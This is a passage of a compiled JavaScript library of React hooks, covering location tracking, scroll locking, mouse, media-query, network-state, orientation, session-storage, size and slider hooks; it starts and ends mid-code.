  return {
    trigger: 'load',
    length: 1
  };
};
var buildState = function buildState(trigger) {
  var _window$history = window.history,
    state = _window$history.state,
    length = _window$history.length;
  var _window$location = window.location,
    hash = _window$location.hash,
    host = _window$location.host,
    hostname = _window$location.hostname,
    href = _window$location.href,
    origin = _window$location.origin,
    pathname = _window$location.pathname,
    port = _window$location.port,
    protocol = _window$location.protocol,
    search = _window$location.search;
  return {
    trigger: trigger,
    state: state,
    length: length,
    hash: hash,
    host: host,
    hostname: hostname,
    href: href,
    origin: origin,
    pathname: pathname,
    port: port,
    protocol: protocol,
    search: search
  };
};
var useLocationBrowser = function useLocationBrowser() {
  var _useState = React.useState(buildState('load')),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var onPopstate = function onPopstate() {
      return setState(buildState('popstate'));
    };
    var onPushstate = function onPushstate() {
      return setState(buildState('pushstate'));
    };
    var onReplacestate = function onReplacestate() {
      return setState(buildState('replacestate'));
    };
    on(window, 'popstate', onPopstate);
    on(window, 'pushstate', onPushstate);
    on(window, 'replacestate', onReplacestate);
    return function () {
      off(window, 'popstate', onPopstate);
      off(window, 'pushstate', onPushstate);
      off(window, 'replacestate', onReplacestate);
    };
  }, []);
  return state;
};
var hasEventConstructor = typeof Event === 'function';
var useLocation = isBrowser && hasEventConstructor ? useLocationBrowser : useLocationServer;

//@ts-ignore
function getClosestBody(el) {
  if (!el) {
    return null;
  } else if (el.tagName === 'BODY') {
    return el;
  } else if (el.tagName === 'IFRAME') {
    var _document = el.contentDocument;
    return _document ? _document.body : null;
  } else if (!el.offsetParent) {
    return null;
  }
  return getClosestBody(el.offsetParent);
}
function preventDefault(rawEvent) {
  var e = rawEvent || window.event;
  // Do not prevent if the event has more than one touch (usually meaning this is a multi touch gesture like pinch to zoom).
  if (e.touches.length > 1) return true;
  if (e.preventDefault) e.preventDefault();
  return false;
}
var isIosDevice = isBrowser && window.navigator && window.navigator.platform && /*#__PURE__*/ /iP(ad|hone|od)/.test(window.navigator.platform);
var bodies = /*#__PURE__*/new Map();
var doc = typeof document === 'object' ? document : undefined;
var documentListenerAdded = false;
var useLockBodyScroll = !doc ? function useLockBodyMock(_locked, _elementRef) {
} : function useLockBody(locked, elementRef) {
  if (locked === void 0) {
    locked = true;
  }
  var bodyRef = React.useRef(doc.body);
  elementRef = elementRef || bodyRef;
  var lock = function lock(body) {
    var bodyInfo = bodies.get(body);
    if (!bodyInfo) {
      bodies.set(body, {
        counter: 1,
        initialOverflow: body.style.overflow
      });
      if (isIosDevice) {
        if (!documentListenerAdded) {
          on(document, 'touchmove', preventDefault, {
            passive: false
          });
          documentListenerAdded = true;
        }
      } else {
        body.style.overflow = 'hidden';
      }
    } else {
      bodies.set(body, {
        counter: bodyInfo.counter + 1,
        initialOverflow: bodyInfo.initialOverflow
      });
    }
  };
  var unlock = function unlock(body) {
    var bodyInfo = bodies.get(body);
    if (bodyInfo) {
      if (bodyInfo.counter === 1) {
        bodies["delete"](body);
        if (isIosDevice) {
          body.ontouchmove = null;
          if (documentListenerAdded) {
            off(document, 'touchmove', preventDefault);
            documentListenerAdded = false;
          }
        } else {
          body.style.overflow = bodyInfo.initialOverflow;
        }
      } else {
        bodies.set(body, {
          counter: bodyInfo.counter - 1,
          initialOverflow: bodyInfo.initialOverflow
        });
      }
    }
  };
  React.useEffect(function () {
    var body = getClosestBody(elementRef.current);
    if (!body) {
      return;
    }
    if (locked) {
      lock(body);
    } else {
      unlock(body);
    }
  }, [locked, elementRef.current]);
  // clean up, on un-mount
  React.useEffect(function () {
    var body = getClosestBody(elementRef.current);
    if (!body) {
      return;
    }
    return function () {
      unlock(body);
    };
  }, []);
};

//@ts-ignore
var useLogger = function useLogger(componentName) {
  for (var _len = arguments.length, rest = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
    rest[_key - 1] = arguments[_key];
  }
  useEffectOnce(function () {
    var _console;
    (_console = console).log.apply(_console, [componentName + " mounted"].concat(rest));
    return function () {
      return console.log(componentName + " unmounted");
    };
  });
  useUpdateEffect(function () {
    var _console2;
    (_console2 = console).log.apply(_console2, [componentName + " updated"].concat(rest));
  });
};

//@ts-ignore
var isTouchEvent = function isTouchEvent(ev) {
  return 'touches' in ev;
};
var preventDefault$1 = function preventDefault(ev) {
  if (!isTouchEvent(ev)) return;
  if (ev.touches.length < 2 && ev.preventDefault) {
    ev.preventDefault();
  }
};
var useLongPress = function useLongPress(callback, _temp) {
  var _ref = _temp === void 0 ? {} : _temp,
    _ref$isPreventDefault = _ref.isPreventDefault,
    isPreventDefault = _ref$isPreventDefault === void 0 ? true : _ref$isPreventDefault,
    _ref$delay = _ref.delay,
    delay = _ref$delay === void 0 ? 300 : _ref$delay;
  var timeout = React.useRef();
  var target = React.useRef();
  var start = React.useCallback(function (event) {
    // prevent ghost click on mobile devices
    if (isPreventDefault && event.target) {
      on(event.target, 'touchend', preventDefault$1, {
        passive: false
      });
      target.current = event.target;
    }
    timeout.current = setTimeout(function () {
      return callback(event);
    }, delay);
  }, [callback, delay, isPreventDefault]);
  var clear = React.useCallback(function () {
    // clearTimeout and removeEventListener
    timeout.current && clearTimeout(timeout.current);
    if (isPreventDefault && target.current) {
      off(target.current, 'touchend', preventDefault$1);
    }
  }, [isPreventDefault]);
  return {
    onMouseDown: function onMouseDown(e) {
      return start(e);
    },
    onTouchStart: function onTouchStart(e) {
      return start(e);
    },
    onMouseUp: clear,
    onMouseLeave: clear,
    onTouchEnd: clear
  };
};

var useMap = function useMap(initialMap) {
  if (initialMap === void 0) {
    initialMap = {};
  }
  var _useState = React.useState(initialMap),
    map = _useState[0],
    _set = _useState[1];
  var stableActions = React.useMemo(function () {
    return {
      set: function set(key, entry) {
        _set(function (prevMap) {
          var _extends2;
          return _extends({}, prevMap, (_extends2 = {}, _extends2[key] = entry, _extends2));
        });
      },
      setAll: function setAll(newMap) {
        _set(newMap);
      },
      remove: function remove(key) {
        _set(function (prevMap) {
          var rest = _objectWithoutPropertiesLoose(prevMap, [key].map(_toPropertyKey));
          return rest;
        });
      },
      reset: function reset() {
        return _set(initialMap);
      }
    };
  }, [_set]);
  var utils = _extends({
    get: React.useCallback(function (key) {
      return map[key];
    }, [map])
  }, stableActions);
  return [map, utils];
};

//@ts-ignore
var getInitialState = function getInitialState(query, defaultState) {
  // Prevent a React hydration mismatch when a default value is provided by not defaulting to window.matchMedia(query).matches.
  if (defaultState !== undefined) {
    return defaultState;
  }
  if (isBrowser) {
    return window.matchMedia(query).matches;
  }
  // A default value has not been provided, and you are rendering on the server, warn of a possible hydration mismatch when defaulting to false.
  {
    console.warn('`useMedia` When server side rendering, defaultState should be defined to prevent a hydration mismatches.');
  }
  return false;
};
var useMedia = function useMedia(query, defaultState) {
  var _useState = React.useState(getInitialState(query, defaultState)),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var mounted = true;
    var mql = window.matchMedia(query);
    var onChange = function onChange() {
      if (!mounted) {
        return;
      }
      setState(!!mql.matches);
    };
    mql.addListener(onChange);
    setState(mql.matches);
    return function () {
      mounted = false;
      mql.removeListener(onChange);
    };
  }, [query]);
  return state;
};

//@ts-ignore
var useMediaDevices = function useMediaDevices() {
  var _useState = React.useState({}),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var mounted = true;
    var onChange = function onChange() {
      navigator.mediaDevices.enumerateDevices().then(function (devices) {
        if (mounted) {
          setState({
            devices: devices.map(function (_ref) {
              var deviceId = _ref.deviceId,
                groupId = _ref.groupId,
                kind = _ref.kind,
                label = _ref.label;
              return {
                deviceId: deviceId,
                groupId: groupId,
                kind: kind,
                label: label
              };
            })
          });
        }
      })["catch"](noop);
    };
    on(navigator.mediaDevices, 'devicechange', onChange);
    onChange();
    return function () {
      mounted = false;
      off(navigator.mediaDevices, 'devicechange', onChange);
    };
  }, []);
  return state;
};
var useMediaDevicesMock = function useMediaDevicesMock() {
  return {};
};
var useMediaDevices$1 = isNavigator && !!navigator.mediaDevices ? useMediaDevices : useMediaDevicesMock;

//@ts-ignore
function useMediatedState(mediator, initialState) {
  var mediatorFn = React.useRef(mediator);
  var _useState = React.useState(initialState),
    state = _useState[0],
    setMediatedState = _useState[1];
  var setState = React.useCallback(function (newState) {
    if (mediatorFn.current.length === 2) {
      mediatorFn.current(newState, setMediatedState);
    } else {
      setMediatedState(mediatorFn.current(newState));
    }
  }, [state]);
  return [state, setState];
}

//@ts-ignore
var useMethods = function useMethods(createMethods, initialState) {
  var reducer = React.useMemo(function () {
    return function (reducerState, action) {
      var _createMethods;
      return (_createMethods = createMethods(reducerState))[action.type].apply(_createMethods, action.payload);
    };
  }, [createMethods]);
  var _useReducer = React.useReducer(reducer, initialState),
    state = _useReducer[0],
    dispatch = _useReducer[1];
  var wrappedMethods = React.useMemo(function () {
    var actionTypes = Object.keys(createMethods(initialState));
    return actionTypes.reduce(function (acc, type) {
      acc[type] = function () {
        for (var _len = arguments.length, payload = new Array(_len), _key = 0; _key < _len; _key++) {
          payload[_key] = arguments[_key];
        }
        return dispatch({
          type: type,
          payload: payload
        });
      };
      return acc;
    }, {});
  }, [createMethods, initialState]);
  return [state, wrappedMethods];
};

//@ts-ignore
var defaultState = {
  acceleration: {
    x: null,
    y: null,
    z: null
  },
  accelerationIncludingGravity: {
    x: null,
    y: null,
    z: null
  },
  rotationRate: {
    alpha: null,
    beta: null,
    gamma: null
  },
  interval: 16
};
var useMotion = function useMotion(initialState) {
  if (initialState === void 0) {
    initialState = defaultState;
  }
  var _useState = React.useState(initialState),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var handler = function handler(event) {
      var acceleration = event.acceleration,
        accelerationIncludingGravity = event.accelerationIncludingGravity,
        rotationRate = event.rotationRate,
        interval = event.interval;
      setState({
        acceleration: {
          x: acceleration.x,
          y: acceleration.y,
          z: acceleration.z
        },
        accelerationIncludingGravity: {
          x: accelerationIncludingGravity.x,
          y: accelerationIncludingGravity.y,
          z: accelerationIncludingGravity.z
        },
        rotationRate: {
          alpha: rotationRate.alpha,
          beta: rotationRate.beta,
          gamma: rotationRate.gamma
        },
        interval: interval
      });
    };
    on(window, 'devicemotion', handler);
    return function () {
      off(window, 'devicemotion', handler);
    };
  }, []);
  return state;
};

//@ts-ignore
var useMount = function useMount(fn) {
  useEffectOnce(function () {
    fn();
  });
};

//@ts-ignore
var useUnmount = function useUnmount(fn) {
  var fnRef = React.useRef(fn);
  // update the ref each render so if it change the newest callback will be invoked
  fnRef.current = fn;
  useEffectOnce(function () {
    return function () {
      return fnRef.current();
    };
  });
};

//@ts-ignore
var useRafState = function useRafState(initialState) {
  var frame = React.useRef(0);
  var _useState = React.useState(initialState),
    state = _useState[0],
    setState = _useState[1];
  var setRafState = React.useCallback(function (value) {
    cancelAnimationFrame(frame.current);
    frame.current = requestAnimationFrame(function () {
      setState(value);
    });
  }, []);
  useUnmount(function () {
    cancelAnimationFrame(frame.current);
  });
  return [state, setRafState];
};

//@ts-ignore
var useMouse = function useMouse(ref) {
  {
    if (typeof ref !== 'object' || typeof ref.current === 'undefined') {
      console.error('useMouse expects a single ref argument.');
    }
  }
  var _useRafState = useRafState({
      docX: 0,
      docY: 0,
      posX: 0,
      posY: 0,
      elX: 0,
      elY: 0,
      elH: 0,
      elW: 0
    }),
    state = _useRafState[0],
    setState = _useRafState[1];
  React.useEffect(function () {
    var moveHandler = function moveHandler(event) {
      if (ref && ref.current) {
        var _ref$current$getBound = ref.current.getBoundingClientRect(),
          left = _ref$current$getBound.left,
          top = _ref$current$getBound.top,
          elW = _ref$current$getBound.width,
          elH = _ref$current$getBound.height;
        var posX = left + window.pageXOffset;
        var posY = top + window.pageYOffset;
        var elX = event.pageX - posX;
        var elY = event.pageY - posY;
        setState({
          docX: event.pageX,
          docY: event.pageY,
          posX: posX,
          posY: posY,
          elX: elX,
          elY: elY,
          elH: elH,
          elW: elW
        });
      }
    };
    on(document, 'mousemove', moveHandler);
    return function () {
      off(document, 'mousemove', moveHandler);
    };
  }, [ref]);
  return state;
};

var nullRef = {
  current: null
};
var useMouseHovered = function useMouseHovered(ref, options) {
  if (options === void 0) {
    options = {};
  }
  var whenHovered = !!options.whenHovered;
  var bound = !!options.bound;
  var isHovered = useHoverDirty(ref, whenHovered);
  var state = useMouse(whenHovered && !isHovered ? nullRef : ref);
  if (bound) {
    state.elX = Math.max(0, Math.min(state.elX, state.elW));
    state.elY = Math.max(0, Math.min(state.elY, state.elH));
  }
  return state;
};

//@ts-ignore
var useMouseWheel = (function () {
  var _useState = React.useState(0),
    mouseWheelScrolled = _useState[0],
    setMouseWheelScrolled = _useState[1];
  React.useEffect(function () {
    var updateScroll = function updateScroll(e) {
      setMouseWheelScrolled(e.deltaY + mouseWheelScrolled);
    };
    on(window, 'wheel', updateScroll, false);
    return function () {
      return off(window, 'wheel', updateScroll);
    };
  });
  return mouseWheelScrolled;
});

//@ts-ignore
var nav$1 = isNavigator ? navigator : undefined;
var conn = nav$1 && (nav$1.connection || nav$1.mozConnection || nav$1.webkitConnection);
function getConnectionState(previousState) {
  var online = nav$1 == null ? void 0 : nav$1.onLine;
  var previousOnline = previousState == null ? void 0 : previousState.online;
  return {
    online: online,
    previous: previousOnline,
    since: online !== previousOnline ? new Date() : previousState == null ? void 0 : previousState.since,
    downlink: conn == null ? void 0 : conn.downlink,
    downlinkMax: conn == null ? void 0 : conn.downlinkMax,
    effectiveType: conn == null ? void 0 : conn.effectiveType,
    rtt: conn == null ? void 0 : conn.rtt,
    saveData: conn == null ? void 0 : conn.saveData,
    type: conn == null ? void 0 : conn.type
  };
}
function useNetworkState(initialState) {
  var _useState = React.useState(initialState != null ? initialState : getConnectionState),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var handleStateChange = function handleStateChange() {
      setState(getConnectionState);
    };
    on(window, 'online', handleStateChange, {
      passive: true
    });
    on(window, 'offline', handleStateChange, {
      passive: true
    });
    if (conn) {
      on(conn, 'change', handleStateChange, {
        passive: true
      });
    }
    return function () {
      off(window, 'online', handleStateChange);
      off(window, 'offline', handleStateChange);
      if (conn) {
        off(conn, 'change', handleStateChange);
      }
    };
  }, []);
  return state;
}

//@ts-ignore

//@ts-ignore
function useObservable(observable$, initialValue) {
  var _useState = React.useState(initialValue),
    value = _useState[0],
    update = _useState[1];
  useIsomorphicLayoutEffect(function () {
    var s = observable$.subscribe(update);
    return function () {
      return s.unsubscribe();
    };
  }, [observable$]);
  return value;
}

//@ts-ignore
var defaultState$1 = {
  angle: 0,
  type: 'landscape-primary'
};
var useOrientation = function useOrientation(initialState) {
  if (initialState === void 0) {
    initialState = defaultState$1;
  }
  var _useState = React.useState(initialState),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var screen = window.screen;
    var mounted = true;
    var onChange = function onChange() {
      if (mounted) {
        var orientation = screen.orientation;
        if (orientation) {
          var angle = orientation.angle,
            type = orientation.type;
          setState({
            angle: angle,
            type: type
          });
        } else if (window.orientation !== undefined) {
          setState({
            angle: typeof window.orientation === 'number' ? window.orientation : 0,
            type: ''
          });
        } else {
          setState(initialState);
        }
      }
    };
    on(window, 'orientationchange', onChange);
    onChange();
    return function () {
      mounted = false;
      off(window, 'orientationchange', onChange);
    };
  }, []);
  return state;
};

//@ts-ignore
var usePageLeave = function usePageLeave(onPageLeave, args) {
  if (args === void 0) {
    args = [];
  }
  React.useEffect(function () {
    if (!onPageLeave) {
      return;
    }
    var handler = function handler(event) {
      event = event ? event : window.event;
      var from = event.relatedTarget || event.toElement;
      if (!from || from.nodeName === 'HTML') {
        onPageLeave();
      }
    };
    on(document, 'mouseout', handler);
    return function () {
      off(document, 'mouseout', handler);
    };
  }, args);
};

//@ts-ignore
// const usePermission = <T extends PermissionDescriptor>(permissionDesc: T): IState => {
var usePermission = function usePermission(permissionDesc) {
  var _useState = React.useState(''),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var mounted = true;
    var permissionStatus = null;
    var onChange = function onChange() {
      if (!mounted) {
        return;
      }
      setState(function () {
        var _permissionStatus$sta, _permissionStatus;
        return (_permissionStatus$sta = (_permissionStatus = permissionStatus) == null ? void 0 : _permissionStatus.state) != null ? _permissionStatus$sta : '';
      });
    };
    navigator.permissions.query(permissionDesc).then(function (status) {
      permissionStatus = status;
      on(permissionStatus, 'change', onChange);
      onChange();
    })["catch"](noop);
    return function () {
      permissionStatus && off(permissionStatus, 'change', onChange);
      mounted = false;
      permissionStatus = null;
    };
  }, [permissionDesc]);
  return state;
};

//@ts-ignore
function usePrevious(state) {
  var ref = React.useRef();
  React.useEffect(function () {
    ref.current = state;
  });
  return ref.current;
}

//@ts-ignore
var strictEquals = function strictEquals(prev, next) {
  return prev === next;
};
function usePreviousDistinct(value, compare) {
  if (compare === void 0) {
    compare = strictEquals;
  }
  var prevRef = React.useRef();
  var curRef = React.useRef(value);
  var isFirstMount = useFirstMountState();
  if (!isFirstMount && !compare(curRef.current, value)) {
    prevRef.current = curRef.current;
    curRef.current = value;
  }
  return prevRef.current;
}

//@ts-ignore
var usePromise = function usePromise() {
  var isMounted = useMountedState();
  return React.useCallback(function (promise) {
    return new Promise(function (resolve, reject) {
      var onValue = function onValue(value) {
        isMounted() && resolve(value);
      };
      var onError = function onError(error) {
        isMounted() && reject(error);
      };
      promise.then(onValue, onError);
    });
  }, []);
};

//@ts-ignore
var useQueue = function useQueue(initialValue) {
  if (initialValue === void 0) {
    initialValue = [];
  }
  var _useState = React.useState(initialValue),
    state = _useState[0],
    set = _useState[1];
  return {
    add: function add(value) {
      set(function (queue) {
        return [].concat(queue, [value]);
      });
    },
    remove: function remove() {
      var result;
      set(function (_ref) {
        var first = _ref[0],
          rest = _ref.slice(1);
        result = first;
        return rest;
      });
      return result;
    },
    get first() {
      return state[0];
    },
    get last() {
      return state[state.length - 1];
    },
    get size() {
      return state.length;
    }
  };
};

//@ts-ignore
var useRaf = function useRaf(ms, delay) {
  if (ms === void 0) {
    ms = 1e12;
  }
  if (delay === void 0) {
    delay = 0;
  }
  var _useState = React.useState(0),
    elapsed = _useState[0],
    set = _useState[1];
  useIsomorphicLayoutEffect(function () {
    var raf;
    var timerStop;
    var start;
    var onFrame = function onFrame() {
      var time = Math.min(1, (Date.now() - start) / ms);
      set(time);
      loop();
    };
    var loop = function loop() {
      raf = requestAnimationFrame(onFrame);
    };
    var onStart = function onStart() {
      timerStop = setTimeout(function () {
        cancelAnimationFrame(raf);
        set(1);
      }, ms);
      start = Date.now();
      loop();
    };
    var timerDelay = setTimeout(onStart, delay);
    return function () {
      clearTimeout(timerStop);
      clearTimeout(timerDelay);
      cancelAnimationFrame(raf);
    };
  }, [ms, delay]);
  return elapsed;
};

//@ts-ignore
function useRafLoop(callback, initiallyActive) {
  if (initiallyActive === void 0) {
    initiallyActive = true;
  }
  var raf = React.useRef(null);
  var rafActivity = React.useRef(false);
  var rafCallback = React.useRef(callback);
  rafCallback.current = callback;
  var step = React.useCallback(function (time) {
    if (rafActivity.current) {
      rafCallback.current(time);
      raf.current = requestAnimationFrame(step);
    }
  }, []);
  var result = React.useMemo(function () {
    return [function () {
      // stop
      if (rafActivity.current) {
        rafActivity.current = false;
        raf.current && cancelAnimationFrame(raf.current);
      }
    }, function () {
      // start
      if (!rafActivity.current) {
        rafActivity.current = true;
        raf.current = requestAnimationFrame(step);
      }
    }, function () {
      return rafActivity.current;
    }];
  }, []);
  React.useEffect(function () {
    if (initiallyActive) {
      result[1]();
    }
    return result[0];
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return result;
}

//@ts-ignore
var getValue = function getValue(search, param) {
  return new URLSearchParams(search).get(param);
};
var useSearchParam = function useSearchParam(param) {
  var location = window.location;
  var _useState = React.useState(function () {
      return getValue(location.search, param);
    }),
    value = _useState[0],
    setValue = _useState[1];
  React.useEffect(function () {
    var onChange = function onChange() {
      setValue(getValue(location.search, param));
    };
    on(window, 'popstate', onChange);
    on(window, 'pushstate', onChange);
    on(window, 'replacestate', onChange);
    return function () {
      off(window, 'popstate', onChange);
      off(window, 'pushstate', onChange);
      off(window, 'replacestate', onChange);
    };
  }, []);
  return value;
};
var useSearchParamServer = function useSearchParamServer() {
  return null;
};
var useSearchParam$1 = isBrowser ? useSearchParam : useSearchParamServer;

var useScratch = function useScratch(params) {
  if (params === void 0) {
    params = {};
  }
  var _params = params,
    disabled = _params.disabled;
  var paramsRef = useLatest(params);
  var _useState = React.useState({
      isScratching: false
    }),
    state = _useState[0],
    setState = _useState[1];
  var refState = React.useRef(state);
  var refScratching = React.useRef(false);
  var refAnimationFrame = React.useRef(null);
  var _useState2 = React.useState(null),
    el = _useState2[0],
    setEl = _useState2[1];
  React.useEffect(function () {
    if (disabled) return;
    if (!el) return;
    var onMoveEvent = function onMoveEvent(docX, docY) {
      cancelAnimationFrame(refAnimationFrame.current);
      refAnimationFrame.current = requestAnimationFrame(function () {
        var _el$getBoundingClient = el.getBoundingClientRect(),
          left = _el$getBoundingClient.left,
          top = _el$getBoundingClient.top;
        var elX = left + window.scrollX;
        var elY = top + window.scrollY;
        var x = docX - elX;
        var y = docY - elY;
        setState(function (oldState) {
          var newState = _extends({}, oldState, {
            dx: x - (oldState.x || 0),
            dy: y - (oldState.y || 0),
            end: Date.now(),
            isScratching: true
          });
          refState.current = newState;
          (paramsRef.current.onScratch || noop)(newState);
          return newState;
        });
      });
    };
    var onMouseMove = function onMouseMove(event) {
      onMoveEvent(event.pageX, event.pageY);
    };
    var onTouchMove = function onTouchMove(event) {
      onMoveEvent(event.changedTouches[0].pageX, event.changedTouches[0].pageY);
    };
    var onMouseUp;
    var onTouchEnd;
    var stopScratching = function stopScratching() {
      if (!refScratching.current) return;
      refScratching.current = false;
      refState.current = _extends({}, refState.current, {
        isScratching: false
      });
      (paramsRef.current.onScratchEnd || noop)(refState.current);
      setState({
        isScratching: false
      });
      off(window, 'mousemove', onMouseMove);
      off(window, 'touchmove', onTouchMove);
      off(window, 'mouseup', onMouseUp);
      off(window, 'touchend', onTouchEnd);
    };
    onMouseUp = stopScratching;
    onTouchEnd = stopScratching;
    var startScratching = function startScratching(docX, docY) {
      if (!refScratching.current) return;
      var _el$getBoundingClient2 = el.getBoundingClientRect(),
        left = _el$getBoundingClient2.left,
        top = _el$getBoundingClient2.top;
      var elX = left + window.scrollX;
      var elY = top + window.scrollY;
      var x = docX - elX;
      var y = docY - elY;
      var time = Date.now();
      var newState = {
        isScratching: true,
        start: time,
        end: time,
        docX: docX,
        docY: docY,
        x: x,
        y: y,
        dx: 0,
        dy: 0,
        elH: el.offsetHeight,
        elW: el.offsetWidth,
        elX: elX,
        elY: elY
      };
      refState.current = newState;
      (paramsRef.current.onScratchStart || noop)(newState);
      setState(newState);
      on(window, 'mousemove', onMouseMove);
      on(window, 'touchmove', onTouchMove);
      on(window, 'mouseup', onMouseUp);
      on(window, 'touchend', onTouchEnd);
    };
    var onMouseDown = function onMouseDown(event) {
      refScratching.current = true;
      startScratching(event.pageX, event.pageY);
    };
    var onTouchStart = function onTouchStart(event) {
      refScratching.current = true;
      startScratching(event.changedTouches[0].pageX, event.changedTouches[0].pageY);
    };
    on(el, 'mousedown', onMouseDown);
    on(el, 'touchstart', onTouchStart);
    return function () {
      off(el, 'mousedown', onMouseDown);
      off(el, 'touchstart', onTouchStart);
      off(window, 'mousemove', onMouseMove);
      off(window, 'touchmove', onTouchMove);
      off(window, 'mouseup', onMouseUp);
      off(window, 'touchend', onTouchEnd);
      if (refAnimationFrame.current) cancelAnimationFrame(refAnimationFrame.current);
      refAnimationFrame.current = null;
      refScratching.current = false;
      refState.current = {
        isScratching: false
      };
      setState(refState.current);
    };
  }, [el, disabled, paramsRef]);
  return [setEl, state];
};

//@ts-ignore
var useScroll = function useScroll(ref) {
  {
    if (typeof ref !== 'object' || typeof ref.current === 'undefined') {
      console.error('`useScroll` expects a single ref argument.');
    }
  }
  var _useRafState = useRafState({
      x: 0,
      y: 0
    }),
    state = _useRafState[0],
    setState = _useRafState[1];
  React.useEffect(function () {
    var handler = function handler() {
      if (ref.current) {
        setState({
          x: ref.current.scrollLeft,
          y: ref.current.scrollTop
        });
      }
    };
    if (ref.current) {
      on(ref.current, 'scroll', handler, {
        capture: false,
        passive: true
      });
    }
    return function () {
      if (ref.current) {
        off(ref.current, 'scroll', handler);
      }
    };
  }, [ref]);
  return state;
};

//@ts-ignore
var useScrolling = function useScrolling(ref) {
  var _useState = React.useState(false),
    scrolling = _useState[0],
    setScrolling = _useState[1];
  React.useEffect(function () {
    if (ref.current) {
      var scrollingTimeout;
      var handleScrollEnd = function handleScrollEnd() {
        setScrolling(false);
      };
      var handleScroll = function handleScroll() {
        setScrolling(true);
        clearTimeout(scrollingTimeout);
        scrollingTimeout = setTimeout(function () {
          return handleScrollEnd();
        }, 150);
      };
      on(ref.current, 'scroll', handleScroll, false);
      return function () {
        if (ref.current) {
          off(ref.current, 'scroll', handleScroll, false);
        }
      };
    }
    return function () {};
  }, [ref]);
  return scrolling;
};

//@ts-ignore
var useSessionStorage = function useSessionStorage(key, initialValue, raw) {
  if (!isBrowser) {
    return [initialValue, function () {}];
  }
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var _useState = React.useState(function () {
      try {
        var sessionStorageValue = sessionStorage.getItem(key);
        if (typeof sessionStorageValue !== 'string') {
          sessionStorage.setItem(key, raw ? String(initialValue) : JSON.stringify(initialValue));
          return initialValue;
        } else {
          return raw ? sessionStorageValue : JSON.parse(sessionStorageValue || 'null');
        }
      } catch (_unused) {
        // If user is in private mode or has storage restriction
        // sessionStorage can throw. JSON.parse and JSON.stringify
        // can throw, too.
        return initialValue;
      }
    }),
    state = _useState[0],
    setState = _useState[1];
  // eslint-disable-next-line react-hooks/rules-of-hooks
  React.useEffect(function () {
    try {
      var serializedState = raw ? String(state) : JSON.stringify(state);
      sessionStorage.setItem(key, serializedState);
    } catch (_unused2) {
      // If user is in private mode or has storage restriction
      // sessionStorage can throw. Also JSON.stringify can throw.
    }
  });
  return [state, setState];
};

var isPrimitive$2 = function isPrimitive(val) {
  return val !== Object(val);
};
var shallowEqualDepsList = function shallowEqualDepsList(prevDeps, nextDeps) {
  return prevDeps.every(function (dep, index) {
    return fastShallowEqual.equal(dep, nextDeps[index]);
  });
};
var useShallowCompareEffect = function useShallowCompareEffect(effect, deps) {
  {
    if (!(deps instanceof Array) || !deps.length) {
      console.warn('`useShallowCompareEffect` should not be used with no dependencies. Use React.useEffect instead.');
    }
    if (deps.every(isPrimitive$2)) {
      console.warn('`useShallowCompareEffect` should not be used with dependencies that are all primitive values. Use React.useEffect instead.');
    }
  }
  useCustomCompareEffect(effect, deps, shallowEqualDepsList);
};

var useState$1 = React.useState,
  useEffect = React.useEffect,
  useRef = React.useRef;
var DRAF = function DRAF(callback) {
  return setTimeout(callback, 35);
};
var useSize = function useSize(element, _temp) {
  var _ref = _temp === void 0 ? {} : _temp,
    _ref$width = _ref.width,
    width = _ref$width === void 0 ? Infinity : _ref$width,
    _ref$height = _ref.height,
    height = _ref$height === void 0 ? Infinity : _ref$height;
  if (!isBrowser) {
    return [typeof element === 'function' ? element({
      width: width,
      height: height
    }) : element, {
      width: width,
      height: height
    }];
  }
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var _useState = useState$1({
      width: width,
      height: height
    }),
    state = _useState[0],
    setState = _useState[1];
  if (typeof element === 'function') {
    element = element(state);
  }
  var style = element.props.style || {};
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var ref = useRef(null);
  var window = null;
  var setSize = function setSize() {
    var iframe = ref.current;
    var size = iframe ? {
      width: iframe.offsetWidth,
      height: iframe.offsetHeight
    } : {
      width: width,
      height: height
    };
    setState(size);
  };
  var onWindow = function onWindow(windowToListenOn) {
    on(windowToListenOn, 'resize', setSize);
    DRAF(setSize);
  };
  // eslint-disable-next-line react-hooks/rules-of-hooks
  useEffect(function () {
    var iframe = ref.current;
    if (!iframe) {
      // iframe will be undefined if component is already unmounted
      return;
    }
    if (iframe.contentWindow) {
      window = iframe.contentWindow;
      onWindow(window);
    } else {
      var onLoad = function onLoad() {
        on(iframe, 'load', onLoad);
        window = iframe.contentWindow;
        onWindow(window);
      };
      off(iframe, 'load', onLoad);
    }
    return function () {
      if (window && window.removeEventListener) {
        off(window, 'resize', setSize);
      }
    };
  }, []);
  style.position = 'relative';
  var sized = React.cloneElement.apply(React, [element, {
    style: style
  }].concat([React.createElement('iframe', {
    ref: ref,
    style: {
      background: 'transparent',
      border: 'none',
      height: '100%',
      left: 0,
      position: 'absolute',
      top: 0,
      width: '100%',
      zIndex: -1
    }
  })].concat(React.Children.toArray(element.props.children))));
  return [sized, state];
};

//@ts-ignore
var useSlider = function useSlider(ref, options) {
  if (options === void 0) {
    options = {};
  }
  var isMounted = useMountedState();
  var isSliding = React.useRef(false);
  var valueRef = React.useRef(0);
  var frame = React.useRef(0);
  var _useSetState = useSetState({
      isSliding: false,
      value: 0
    }),
    state = _useSetState[0],
    setState = _useSetState[1];
  valueRef.current = state.value;
  React.useEffect(function () {
    if (isBrowser) {
      var styles = options.styles === undefined ? true : options.styles;
      var reverse = options.reverse === undefined ? false : options.reverse;
      if (ref.current && styles) {
        ref.current.style.userSelect = 'none';
      }
      var startScrubbing = function startScrubbing() {
        if (!isSliding.current && isMounted()) {
          (options.onScrubStart || noop)();
          isSliding.current = true;
          setState({
            isSliding: true
          });
          bindEvents();
        }
      };
      var stopScrubbing = function stopScrubbing() {
        if (isSliding.current && isMounted()) {
          (options.onScrubStop || noop)(valueRef.current);
          isSliding.current = false;
          setState({
            isSliding: false
          });
          unbindEvents();
        }
      };
      var onMouseDown = function onMouseDown(event) {
